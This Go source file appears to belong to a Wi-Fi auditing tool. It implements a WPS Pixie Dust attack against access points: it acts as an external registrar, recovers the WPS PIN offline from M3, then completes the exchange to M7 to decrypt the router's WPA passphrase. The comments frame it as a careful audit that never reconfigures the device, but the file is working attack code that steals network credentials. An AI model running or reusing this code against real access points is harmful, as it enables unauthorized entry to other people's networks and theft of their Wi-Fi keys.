package wps

import (
	"context"
	"crypto/rand"
	"encoding/binary"
	"errors"
	"fmt"
	"time"
)

// The over-the-air half: driving the registration protocol to M3 and stopping.
//
// WSC rides inside EAP as an expanded type (vendor 0x00372A, "WFA", vendor type 1), which
// itself rides inside 802.1X over an ordinary data frame. So the exchange is:
//
//	associate → EAPOL-Start → EAP-Request/Identity ← → "WFA-SimpleConfig-Registrar-1-0"
//	→ WSC_START ← → M1 ← → M2 → → M3 ← → disconnect
//
// Four WSC messages, one association, a couple of seconds. Compare with online PIN recovery:
// thousands of round trips over hours, which locks WPS on the access point, fills the client's
// logs, and on some models destabilises the radio. This is why WARP does not implement that.

// Transport carries 802.1X payloads to and from the access point.
//
// The same shape as the certificate harvester's, and for the same reason: the state machine
// has to be exercisable without a radio, on a machine that has none.
type Transport interface {
	Send(ctx context.Context, eapol []byte) error
	Receive(ctx context.Context) ([]byte, error)
}

// EAP codes and the expanded-type header WSC travels in.
const (
	eapCodeRequest  = 1
	eapCodeResponse = 2
	eapCodeFailure  = 4

	eapTypeIdentity = 1
	eapTypeExpanded = 254
)

// wfaVendor is the Wi-Fi Alliance vendor ID, and wscVendorType is Simple Config.
var (
	wfaVendor     = [3]byte{0x00, 0x37, 0x2A}
	wscVendorType = uint32(1)
)

// WSC op-codes inside the expanded EAP payload.
const (
	opWSCStart = 0x01
	opWSCACK   = 0x02
	opWSCNACK  = 0x03
	opWSCMsg   = 0x04
	opWSCDone  = 0x05
	opWSCFrag  = 0x06
)

// registrarIdentity is what an external registrar answers the identity request with. The
// access point uses it to decide which role it is playing, so it is not cosmetic.
const registrarIdentity = "WFA-SimpleConfig-Registrar-1-0"

// ExchangeOptions bounds one Pixie Dust exchange.
type ExchangeOptions struct {
	// Timeout bounds one request/response round.
	Timeout time.Duration
	// Rounds bounds the whole exchange.
	Rounds int
	// Log, when set, receives a one-line trace of each WSC step, for diagnosing an exchange that
	// stalls or is refused on real hardware. nil in tests and in the normal path.
	Log func(format string, args ...any)
}

func (o ExchangeOptions) log(format string, args ...any) {
	if o.Log != nil {
		o.Log(format, args...)
	}
}

// configErrorName names a WSC Configuration Error code (WSC 2.0, Table 34), for diagnosing a NACK.
func configErrorName(code uint16) string {
	switch code {
	case 0:
		return "no error"
	case 6:
		return "network authentication failure"
	case 12:
		return "multiple PBC sessions"
	case 13:
		return "rogue activity suspected"
	case 14:
		return "device busy"
	case 15:
		return "setup locked"
	case 16:
		return "message timeout"
	case 17:
		return "registration session timeout"
	case 18:
		return "device password (PIN) authentication failure"
	default:
		return "unspecified"
	}
}

func (o ExchangeOptions) withDefaults() ExchangeOptions {
	if o.Timeout <= 0 {
		o.Timeout = 3 * time.Second
	}
	if o.Rounds <= 0 {
		o.Rounds = 24
	}
	return o
}

// Device is what M1 said about the access point.
//
// Recorded on the result because the chipset largely determines whether Pixie Dust works, and
// because a report naming the model is far more useful to whoever has to fix it than one
// naming a BSSID.
type Device struct {
	Manufacturer string `json:"manufacturer,omitempty"`
	ModelName    string `json:"model_name,omitempty"`
	ModelNumber  string `json:"model_number,omitempty"`
	DeviceName   string `json:"device_name,omitempty"`
	SerialNumber string `json:"serial_number,omitempty"`
	MAC          string `json:"mac,omitempty"`
}

// ErrNoWPS is returned when the access point never started a WSC conversation.
var ErrNoWPS = errors.New(
	"wps: the access point did not start a WPS exchange; WPS may be disabled or locked")

// ErrLocked is returned when the access point refuses because WPS is locked.
var ErrLocked = errors.New(
	"wps: the access point refused the registration; WPS is most likely locked, which is " +
		"itself the correct configuration and worth reporting as one")

// Exchange runs the registration protocol, recovers the PIN offline from M3, and - when that
// succeeds - goes on to complete registration with the recovered PIN so it can read the access
// point's own configuration (above all the WPA passphrase) out of M7.
//
// It stops at M7 and never sends M8. Registration is not completed and no configuration is written
// back to the access point, so nothing is reconfigured and nothing joins the network - the run
// only reads what the access point volunteers about itself once it has proven the PIN. A secure
// access point whose PIN cannot be recovered stops at M3, exactly as before.
//
// The returned Result carries the recovery outcome (and the passphrase, when M7 was reached); the
// caller does not run Recover itself.
func Exchange(ctx context.Context, t Transport, o ExchangeOptions) (Observation, Device, Result, error) {
	o = o.withDefaults()

	registrar, err := NewDHKeypair()
	if err != nil {
		return Observation{}, Device{}, Result{}, err
	}
	n2 := make([]byte, NonceLen)
	if _, err := rand.Read(n2); err != nil {
		return Observation{}, Device{}, Result{}, fmt.Errorf("wps: generate registrar nonce: %w", err)
	}

	if err := t.Send(ctx, eapolStart()); err != nil {
		return Observation{}, Device{}, Result{}, fmt.Errorf("wps: send EAPOL-Start: %w", err)
	}

	var (
		obs        Observation
		dev        Device
		keys       Keys
		result     Result
		rawPrev    []byte // the last WSC message received, for the next authenticator
		rs1, rs2   []byte // registrar secret nonces, revealed across M4/M6
		psk1, psk2 []byte // the recovered PIN's halves, bound under AuthKey
		sawWSC     bool
		haveM1     bool
		nakSeen    bool
	)

	for round := 0; round < o.Rounds; round++ {
		if err := ctx.Err(); err != nil {
			return Observation{}, dev, result, err
		}

		rctx, cancel := context.WithTimeout(ctx, o.Timeout)
		payload, err := t.Receive(rctx)
		cancel()
		if err != nil {
			if !sawWSC {
				return Observation{}, dev, result, ErrNoWPS
			}
			if nakSeen {
				return Observation{}, dev, result, ErrLocked
			}
			// If the PIN is already recovered, a lost M5/M7 is not a failure of the attack - the
			// finding stands, just without the passphrase.
			if result.Recovered {
				return obs, dev, result, nil
			}
			return Observation{}, dev, result, fmt.Errorf("wps: waiting for the next message: %w", err)
		}

		code, id, typ, body, err := parseEAP(payload)
		if err != nil {
			o.log("round %d: unparseable EAP (%d bytes)", round, len(payload))
			continue
		}
		if code == eapCodeFailure {
			o.log("round %d: EAP-Failure (haveM1=%v)", round, haveM1)
			if result.Recovered {
				return obs, dev, result, nil
			}
			if haveM1 {
				return Observation{}, dev, result, ErrLocked
			}
			return Observation{}, dev, result, ErrNoWPS
		}
		if code != eapCodeRequest {
			o.log("round %d: EAP code=%d type=%d (ignored)", round, code, typ)
			continue
		}

		if typ == eapTypeIdentity {
			o.log("round %d: EAP-Request/Identity → sending registrar identity", round)
			if err := t.Send(ctx, eapolPacket(buildEAP(
				eapCodeResponse, id, eapTypeIdentity, []byte(registrarIdentity)))); err != nil {
				return Observation{}, dev, result, fmt.Errorf("wps: send identity: %w", err)
			}
			continue
		}
		if typ != eapTypeExpanded {
			o.log("round %d: EAP-Request type=%d (not WSC)", round, typ)
			continue
		}

		op, wsc, err := parseExpanded(body)
		if err != nil {
			o.log("round %d: unparseable WSC expanded payload", round)
			continue
		}
		sawWSC = true

		switch op {
		case opWSCStart:
			// The access point is ready. It sends M1 unprompted next; acknowledging is enough.
			o.log("round %d: WSC_START → ACK", round)
			if err := t.Send(ctx, eapolPacket(buildWSC(id, opWSCACK, nil))); err != nil {
				return Observation{}, dev, result, err
			}

		case opWSCNACK:
			ce := uint16(0)
			if v, ok := parseTLVs(wsc)[attrConfigError]; ok && len(v) == 2 {
				ce = binary.BigEndian.Uint16(v)
			}
			o.log("round %d: WSC_NACK from the access point (config error %d: %s)",
				round, ce, configErrorName(ce))
			if result.Recovered {
				return obs, dev, result, nil
			}
			nakSeen = true
			return Observation{}, dev, result, ErrLocked

		case opWSCMsg:
			switch msgTypeOf(wsc) {
			case msgM1:
				m1, err := ParseM1(wsc)
				if err != nil {
					o.log("round %d: M1 did not parse: %v", round, err)
					continue
				}
				o.log("round %d: received M1 (%s / %s) → building and sending M2",
					round, m1.Manufacturer, m1.ModelName)
				haveM1 = true
				rawPrev = append([]byte(nil), wsc...)
				dev = Device{
					Manufacturer: m1.Manufacturer, ModelName: m1.ModelName,
					ModelNumber: m1.ModelNumber, DeviceName: m1.DeviceName,
					SerialNumber: m1.SerialNumber, MAC: macString(m1.MAC),
				}

				shared, err := registrar.Shared(m1.PKE)
				if err != nil {
					return Observation{}, dev, result, err
				}
				// The MAC from M1, not the BSSID we aimed at: on a multi-BSSID radio those
				// differ, and using the wrong one derives keys that verify against nothing.
				keys, err = DeriveKeys(shared, m1.ENonce, m1.MAC, n2)
				if err != nil {
					return Observation{}, dev, result, err
				}

				obs = Observation{
					PKE:     m1.PKE,
					PKR:     registrar.Public,
					AuthKey: keys.AuthKey,
					ENonce:  m1.ENonce,
					At:      time.Now(),
				}

				m2, err := BuildM2(M2Options{
					EnrolleeNonce: m1.ENonce, UUIDE: m1.UUIDE,
					RegistrarNonce: n2, PKR: registrar.Public,
					AuthKey: keys.AuthKey, PreviousMessage: rawPrev,
				})
				if err != nil {
					return Observation{}, dev, result, err
				}
				if err := t.Send(ctx, eapolPacket(buildWSC(id, opWSCMsg, m2))); err != nil {
					return Observation{}, dev, result, fmt.Errorf("wps: send M2: %w", err)
				}

			case msgM3:
				m3, err := ParseM3(wsc)
				if err != nil {
					o.log("round %d: M3 did not parse: %v", round, err)
					continue
				}
				if !haveM1 {
					return Observation{}, dev, result, errors.New(
						"wps: the access point sent M3 without M1; the exchange cannot be keyed")
				}
				obs.EHash1 = m3.EHash1
				obs.EHash2 = m3.EHash2
				rawPrev = append([]byte(nil), wsc...)

				// Recover the PIN offline, here, so the run can go on to read the passphrase. A
				// secure access point returns not-recovered and the exchange stops at M3.
				result, err = Recover(obs)
				if err != nil {
					return Observation{}, dev, result, err
				}
				if !result.Recovered {
					o.log("round %d: received M3 → PIN not recoverable, stopping at M3", round)
					_ = t.Send(ctx, eapolPacket(buildWSC(id, opWSCNACK, nackBody())))
					_ = t.Send(ctx, eapolLogoff())
					return obs, dev, result, nil
				}
				o.log("round %d: received M3 → PIN %s recovered, completing registration for the passphrase",
					round, result.PIN)

				// The PIN halves, bound to the registrar's secret nonces, are M4's proof that the
				// registrar holds the PIN. An 8-digit PIN splits 4/4.
				half := (len(result.PIN) + 1) / 2
				psk1 = pskHalf(keys.AuthKey, result.PIN[:half])
				psk2 = pskHalf(keys.AuthKey, result.PIN[half:])
				if rs1, err = newSecretNonce(); err != nil {
					return obs, dev, result, err
				}
				if rs2, err = newSecretNonce(); err != nil {
					return obs, dev, result, err
				}

				m4, err := BuildM4(M4Options{
					AuthKey: keys.AuthKey, KeyWrapKey: keys.KeyWrapKey,
					EnrolleeNonce: obs.ENonce, PKE: obs.PKE, PKR: obs.PKR,
					PSK1: psk1, PSK2: psk2, RS1: rs1, RS2: rs2, PreviousMessage: rawPrev,
				})
				if err != nil {
					return obs, dev, result, err
				}
				if err := t.Send(ctx, eapolPacket(buildWSC(id, opWSCMsg, m4))); err != nil {
					// M4 send failed but the PIN is in hand; the finding still stands.
					return obs, dev, result, nil
				}

			case msgM5:
				// The enrollee opened its E-S1; reveal R-S2 in M6 so it will open E-S2 and its
				// settings in M7. We do not verify E-Hash1 here - the offline recovery already
				// proved the nonces.
				o.log("round %d: received M5 → sending M6", round)
				rawPrev = append([]byte(nil), wsc...)
				m6, err := BuildM6(M6Options{
					AuthKey: keys.AuthKey, KeyWrapKey: keys.KeyWrapKey,
					EnrolleeNonce: obs.ENonce, RS2: rs2, PreviousMessage: rawPrev,
				})
				if err != nil {
					return obs, dev, result, err
				}
				if err := t.Send(ctx, eapolPacket(buildWSC(id, opWSCMsg, m6))); err != nil {
					return obs, dev, result, nil
				}

			case msgM7:
				// The prize: M7's encrypted settings carry the access point's own passphrase.
				settings, err := ParseM7(wsc, keys.KeyWrapKey)
				if err != nil {
					o.log("round %d: received M7 but could not read its settings: %v", round, err)
					// Stop cleanly; the PIN still stands.
					_ = t.Send(ctx, eapolPacket(buildWSC(id, opWSCNACK, nackBody())))
					_ = t.Send(ctx, eapolLogoff())
					return obs, dev, result, nil
				}
				result.NetworkKey = settings.NetworkKey
				result.KeyESSID = settings.SSID
				o.log("round %d: received M7 → passphrase read; stopping at M7 (no M8, nothing reconfigured)",
					round)
				// Never send M8 - that writes a new configuration to the access point. NACK and go.
				_ = t.Send(ctx, eapolPacket(buildWSC(id, opWSCNACK, nackBody())))
				_ = t.Send(ctx, eapolLogoff())
				return obs, dev, result, nil

			default:
				// Some other WSC message. Not an error - vendors interleave things - but there is
				// nothing to do with it.
			}

		case opWSCDone, opWSCACK, opWSCFrag:
			// Nothing to do.
		}
	}

	if result.Recovered {
		return obs, dev, result, nil
	}
	if !sawWSC {
		return Observation{}, dev, result, ErrNoWPS
	}
	return Observation{}, dev, result, fmt.Errorf(
		"wps: the exchange ran %d rounds without reaching M3", o.Rounds)
}

// msgTypeOf returns a WSC message's type attribute, or 0 if absent.
func msgTypeOf(wsc []byte) byte {
	if v, ok := parseTLVs(wsc)[attrMessageType]; ok && len(v) == 1 {
		return v[0]
	}
	return 0
}

// nackBody is a minimal WSC_NACK: version, message type, and a config error saying the
// registration was cancelled. Sending it ends the exchange cleanly rather than leaving the
// access point holding a half-finished registration until its timer fires.
func nackBody() []byte {
	var b []byte
	b = appendTLV8(b, attrVersion, 0x10)
	b = appendTLV8(b, attrMessageType, 0x0E) // WSC_NACK
	b = appendTLV16(b, attrConfigError, 0x0010)
	return b
}

// buildEAP assembles an EAP packet.
func buildEAP(code, id byte, typ byte, data []byte) []byte {
	out := make([]byte, 5+len(data))
	out[0], out[1] = code, id
	binary.BigEndian.PutUint16(out[2:4], uint16(len(out)))
	out[4] = typ
	copy(out[5:], data)
	return out
}

// buildWSC wraps a WSC message in the expanded EAP type.
func buildWSC(id byte, op byte, msg []byte) []byte {
	body := make([]byte, 0, 7+len(msg))
	body = append(body, wfaVendor[0], wfaVendor[1], wfaVendor[2])
	body = binary.BigEndian.AppendUint32(body, wscVendorType)
	body = append(body, op, 0x00) // op-code, flags
	body = append(body, msg...)
	return buildEAP(eapCodeResponse, id, eapTypeExpanded, body)
}

// parseEAP splits an 802.1X payload into its EAP header and body.
func parseEAP(b []byte) (code, id, typ byte, body []byte, err error) {
	if len(b) < 4 {
		return 0, 0, 0, nil, errors.New("wps: short 802.1X frame")
	}
	if b[1] != 0x00 { // EAPOL type: EAP-Packet
		return 0, 0, 0, nil, errors.New("wps: 802.1X frame is not an EAP-Packet")
	}
	eap := b[4:]
	if n := int(binary.BigEndian.Uint16(b[2:4])); n > 0 && n <= len(eap) {
		eap = eap[:n]
	}
	if len(eap) < 4 {
		return 0, 0, 0, nil, errors.New("wps: short EAP packet")
	}
	if eap[0] == eapCodeFailure || len(eap) == 4 {
		return eap[0], eap[1], 0, nil, nil
	}
	return eap[0], eap[1], eap[4], eap[5:], nil
}

// parseExpanded unwraps the WFA Simple Config expanded EAP type.
func parseExpanded(b []byte) (op byte, msg []byte, err error) {
	if len(b) < 9 {
		return 0, nil, errors.New("wps: short expanded EAP payload")
	}
	if b[0] != wfaVendor[0] || b[1] != wfaVendor[1] || b[2] != wfaVendor[2] {
		return 0, nil, errors.New("wps: expanded EAP payload is not Wi-Fi Alliance")
	}
	if binary.BigEndian.Uint32(b[3:7]) != wscVendorType {
		return 0, nil, errors.New("wps: expanded EAP payload is not Simple Config")
	}
	// b[7] is the op-code, b[8] the flags. Fragmentation is not handled: a WSC message that
	// needs it is larger than any M1 or M3 in practice.
	return b[7], b[9:], nil
}

// EAPOL framing. Duplicated from the transmit side rather than imported, so this package does
// not depend on the injector and stays exercisable with no radio.
func eapolStart() []byte  { return []byte{0x01, 0x01, 0, 0} }
func eapolLogoff() []byte { return []byte{0x01, 0x02, 0, 0} }

func eapolPacket(eap []byte) []byte {
	p := []byte{0x01, 0x00, byte(len(eap) >> 8), byte(len(eap))}
	return append(p, eap...)
}

func macString(b []byte) string {
	if len(b) != 6 {
		return ""
	}
	return fmt.Sprintf("%02x:%02x:%02x:%02x:%02x:%02x", b[0], b[1], b[2], b[3], b[4], b[5])
}
